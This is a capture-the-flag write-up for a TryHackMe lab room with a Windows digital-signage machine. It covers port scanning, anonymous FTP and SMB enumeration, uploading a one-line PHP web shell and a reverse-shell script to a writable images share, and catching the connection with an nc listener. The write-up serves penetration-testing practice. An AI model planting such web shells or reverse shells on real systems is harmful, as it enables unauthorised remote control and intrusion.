---
A room that contains a rushed Windows based Digital Sign system. Can you breach it?
---

# AllSignsPoint2Pwnage — Writeup

## Overview
### AllSignsPoint2Pwnage — Writeup
### AllSignsPoint2Pwnage — Writeup
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a5b0f0ea5a8dc33948e69e28c3cc4303.jpeg)

## Enumeration
Start Machine
Deploy the Virtual Machine and Enumerate it. Please note that it can take upto 5 minutes for the machine to fully boot.
IP:  MACHINE_IP
Answer the questions below
Deploy the machine
Completed
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.76.135 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.76.135:21
Open 10.10.76.135:80
Open 10.10.76.135:135
Open 10.10.76.135:139
Open 10.10.76.135:443
Open 10.10.76.135:445
Open 10.10.76.135:3389
Open 10.10.76.135:5040
Open 10.10.76.135:49665
Open 10.10.76.135:49664
Open 10.10.76.135:49667
Open 10.10.76.135:49666
Open 10.10.76.135:49668
Open 10.10.76.135:49672
Open 10.10.76.135:49677
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 16:09 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:09
Completed NSE at 16:09, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:09
Completed Parallel DNS resolution of 1 host. at 16:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:09
Scanning 10.10.76.135 [15 ports]
Discovered open port 21/tcp on 10.10.76.135
Discovered open port 80/tcp on 10.10.76.135
Discovered open port 3389/tcp on 10.10.76.135
Discovered open port 139/tcp on 10.10.76.135
Discovered open port 443/tcp on 10.10.76.135
Discovered open port 135/tcp on 10.10.76.135
Discovered open port 445/tcp on 10.10.76.135
Discovered open port 5040/tcp on 10.10.76.135
Discovered open port 49668/tcp on 10.10.76.135
Discovered open port 49664/tcp on 10.10.76.135
Discovered open port 49672/tcp on 10.10.76.135
Discovered open port 49677/tcp on 10.10.76.135
Discovered open port 49666/tcp on 10.10.76.135
Discovered open port 49665/tcp on 10.10.76.135
Discovered open port 49667/tcp on 10.10.76.135
Completed Connect Scan at 16:09, 0.49s elapsed (15 total ports)
Initiating Service scan at 16:09
Scanning 15 services on 10.10.76.135
Service scan Timing: About 40.00% done; ETC: 16:12 (0:01:27 remaining)
Completed Service scan at 16:12, 162.59s elapsed (15 services on 1 host)
NSE: Script scanning 10.10.76.135.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:12
NSE Timing: About 99.76% done; ETC: 16:13 (0:00:00 remaining)
Completed NSE at 16:13, 34.34s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 16.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Nmap scan report for 10.10.76.135
Host is up, received user-set (0.24s latency).
Scanned at 2023-01-23 16:09:48 EST for 214s

PORT      STATE SERVICE        REASON  VERSION
21/tcp    open  ftp            syn-ack Microsoft ftpd
80/tcp    open  http           syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1g PHP/7.4.11)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-title: Simple Slide Show
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
135/tcp   open  msrpc?         syn-ack
139/tcp   open  netbios-ssn    syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/https      syn-ack Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a44cc99e84b26f9e639f9ed229dee0
| SHA-1: b0238c547a905bfa119c4e8baccaeacf36491ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds?  syn-ack
3389/tcp  open  ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=DESKTOP-997GG7D
| Issuer: commonName=DESKTOP-997GG7D
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-22T20:53:59
| Not valid after:  2023-07-24T20:53:59
| MD5:   4c452b3b4fc5d69b6d36f18c0f75ae81
| SHA-1: 69f81a315f3494ef05ffa53da64b34060ed2c0d6
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQd46CdVdtlKdKQPVWxJQrXTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwHhcNMjMwMTIyMjA1MzU5WhcNMjMw
| NzI0MjA1MzU5WjAaMRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDAEoZ2M2OvK1/vWXBa5qv3Wd/gmfzO6i5b
| tLtkHhYC2toAZKYL70e7RapqT3Yu+ST+S7dywrY4uDuwMEiU6FqO4A1aIeOGuil6
| wfFALIEgCHYjwMdciV2lZzjAfWQ1lTmcTEdTW0/UgpiYPlqeGIhnM9C+x2+WwKnF
| owkZtBEWovzqiq5MbHu2fwzNqT9T/cI9k42CA2ycZm1RM/SmIzUosWiWmrCWveVi
| N1QfbCR0QpseQADPqf5TtzqFG0+8PiCs0FLIQHOgel8nIzZbk1fkKfgbGF+MaI9N
| TnyJbDSqtmHt6/RbQ5TTi1vyrfYqNBC0F9PYL+L37IpvlL24C6UhAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAMiC3bOEFu+NstzIXmZzhVwdWX7Ig/o4u9Ieu/UJALfNhuXuBmEMdzEDu
| Ar3QZJi6rOxHHJM9dS9u6VOP3SmdRDLExctpjHwW8h/IPIquEgZ3v6ChI+PY15Af
| d2hUWP9Uc9WDVoI3LanqV2BaDZBGh9uaMrdUeCBFbGl6w92s1jRMi1pQPUekLPAm
| 4ELbY+nr2bnsca71fwSLDep+g3BO1/l5gJefLnjpYvzE9mnDqBJ9J/Cp7ceZhley
| UFUo9XX+YSkwJN7X1VKi3cPFzxaAJTQ1o2W3DeekL8/dgJq0ppFK2q88N6PLgOtv
| u/gCcD3m1Ula2FiekfCbom55ee6U3Q==
|_-----END CERTIFICATE-----
5040/tcp  open  unknown        syn-ack
49664/tcp open  msrpc          syn-ack Microsoft Windows RPC
49665/tcp open  msrpc          syn-ack Microsoft Windows RPC
49666/tcp open  msrpc          syn-ack Microsoft Windows RPC
49667/tcp open  msrpc          syn-ack Microsoft Windows RPC
49668/tcp open  msrpc          syn-ack Microsoft Windows RPC
49672/tcp open  msrpc          syn-ack Microsoft Windows RPC
49677/tcp open  msrpc          syn-ack Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26468/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 11198/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34572/udp): CLEAN (Timeout)
|   Check 4 (port 56226/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.75 seconds
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.76.135
Connected to 10.10.76.135.
220 Microsoft FTP Service
Name (10.10.76.135:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49857|)
150 Opening ASCII mode data connection.
11-14-20  03:26PM                  173 notice.txt
226 Transfer complete.
ftp> more notice.txt
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N -L 10.10.76.135

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      
	Installs$       Disk      
	IPC$            IPC       Remote IPC
	Users           Disk
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ enum4linux -a -u "guest" -p "" 10.10.76.135
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan 23 16:28:55 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.76.135
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.76.135 )============================

[E] Can't find workgroup/domain

 ================================( Nbtstat Information for 10.10.76.135 )================================

Looking up status of 10.10.76.135
No reply from 10.10.76.135

 ===================================( Session Check on 10.10.76.135 )===================================

[+] Server 10.10.76.135 allows sessions using username 'guest', password ''

 ================================( Getting domain SID for 10.10.76.135 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

 ===================================( OS information on 10.10.76.135 )===================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.76.135 from srvinfo: 
	10.10.76.135   Wk Sv NT             
	platform_id     :	500
	os version      :	10.0
	server type     :	0x1003

 =======================================( Users on 10.10.76.135 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.76.135 )=================================

do_connect: Connection to 10.10.76.135 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      
	Installs$       Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.76.135

//10.10.76.135/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.76.135/C$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.76.135/images$	Mapping: OK Listing: OK Writing: N/A
//10.10.76.135/Installs$	Mapping: OK Listing: DENIED Writing: N/A

[E] Can't understand response:

NT_STATUS_NO_SUCH_FILE listing \*
//10.10.76.135/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.10.76.135/Users	Mapping: OK Listing: OK Writing: N/A

 ============================( Password Policy Information for 10.10.76.135 )============================

[E] Unexpected error from polenum:

[+] Attaching to 10.10.76.135 using guest

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.76.135)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: rpc_s_access_denied

[E] Failed to get password policy with rpcclient

 =======================================( Groups on 10.10.76.135 )=======================================

[+] Getting builtin groups:

[+]  Getting builtin group memberships:

[+]  Getting local groups:

[+]  Getting local group memberships:

[+]  Getting domain groups:

[+]  Getting domain group memberships:

 ==================( Users on 10.10.76.135 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[I] Found new SID: 
S-1-5-21-201290883-77286733-747258586

[+] Enumerating users using SID S-1-5-90 and logon username 'guest', password ''

[+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)

[+] Enumerating users using SID S-1-5-21-201290883-77286733-747258586 and logon username 'guest', password ''

S-1-5-21-201290883-77286733-747258586-500 DESKTOP-997GG7D\Administrator (Local User)
S-1-5-21-201290883-77286733-747258586-501 DESKTOP-997GG7D\Guest (Local User)
S-1-5-21-201290883-77286733-747258586-503 DESKTOP-997GG7D\DefaultAccount (Local User)
S-1-5-21-201290883-77286733-747258586-504 DESKTOP-997GG7D\WDAGUtilityAccount (Local User)
S-1-5-21-201290883-77286733-747258586-513 DESKTOP-997GG7D\None (Domain Group)
S-1-5-21-201290883-77286733-747258586-1001 DESKTOP-997GG7D\sign (Local User)

──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N \\\\10.10.253.118\\images$                  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 26 13:19:19 2021
  ..                                  D        0  Tue Jan 26 13:19:19 2021
  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021

http://10.10.253.118/images/
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ nano shell_pwn.php
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cat shell_pwn.php   
<?php system($_GET['x']); ?>
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -N \\\\10.10.253.118\\images$
Try "help" to get a list of possible commands.
smb: \> put shell_pwn.php 
putting file shell_pwn.php as \shell_pwn.php (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Mon Jan 23 17:18:18 2023
  ..                                  D        0  Mon Jan 23 17:18:18 2023
  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021
  shell_pwn.php                       A       29  Mon Jan 23 17:18:18 2023

		10861311 blocks of size 4096. 4141871 blocks available

Fatal error: Unknown: Failed opening required 'C:/xampp/htdocs/images/shell_pwn.php'

uhmm another revshell

https://www.revshells.com/ (PHP Ivan Sincek)

─$ cat payload_ivan.php 
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.

...

smb: \> put payload_ivan.php 
putting file payload_ivan.php as \payload_ivan.php (2.8 kb/s) (average 1.7 kb/s)
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.253.118.
Ncat: Connection from 10.10.253.118:49865.
SOCKET: Shell has connected! PID: 5576
whoami
ft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.
